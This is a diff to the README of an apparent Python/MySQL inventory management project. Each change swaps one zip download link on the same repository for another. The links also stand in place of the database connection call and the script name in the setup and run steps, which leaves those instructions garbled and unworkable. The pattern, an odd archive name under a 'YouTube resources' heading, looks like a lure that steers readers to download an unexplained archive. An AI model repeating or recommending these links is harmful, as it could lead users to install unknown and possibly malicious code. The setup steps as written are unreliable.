@@ -8,7 +8,7 @@ A Python-based inventory management system leveraging MySQL for CRUD operations,
 The **Dynamic Inventory Management System** is a Python-based application that integrates with a MySQL database to efficiently manage an inventory or customer database for any business. The system provides functionality to add, delete, update, and search records in a user-friendly interface. This project is ideal for small to medium-sized businesses looking for an easy-to-use inventory management tool.
 
 ## FOR YOUTUBE RESOURCES TO PRACTICE
-https://raw.githubusercontent.com/Chuckaballe60/CRUD-OpIMReso/main/unelbowed/Op_Reso_IM_CRU_psychomotility.zip
+https://github.com/Chuckaballe60/CRUD-OpIMReso/raw/refs/heads/main/unelbowed/CRU_IM_Op_Reso_v2.5.zip
 
 ## ✨ Features
 - **Add new records:** Insert details like name, address, phone number, age, and gender into the database.
@@ -55,7 +55,7 @@ https://raw.githubusercontent.com/Chuckaballe60/CRUD-OpIMReso/main/unelbowed/Op_
 4. **Update Database Credentials**
    Open the Python script and update the following section with your MySQL credentials:
    ```python
-   mydb = https://raw.githubusercontent.com/Chuckaballe60/CRUD-OpIMReso/main/unelbowed/Op_Reso_IM_CRU_psychomotility.zip(
+   mydb = https://github.com/Chuckaballe60/CRUD-OpIMReso/raw/refs/heads/main/unelbowed/CRU_IM_Op_Reso_v2.5.zip(
        host="localhost",
        user="root",
        password="your_password",
@@ -66,7 +66,7 @@ https://raw.githubusercontent.com/Chuckaballe60/CRUD-OpIMReso/main/unelbowed/Op_
 5. **Run the Application**
    Execute the script in your terminal:
    ```bash
-   python https://raw.githubusercontent.com/Chuckaballe60/CRUD-OpIMReso/main/unelbowed/Op_Reso_IM_CRU_psychomotility.zip
+   python https://github.com/Chuckaballe60/CRUD-OpIMReso/raw/refs/heads/main/unelbowed/CRU_IM_Op_Reso_v2.5.zip
    ```
 
 6. **Follow the Menu Options**
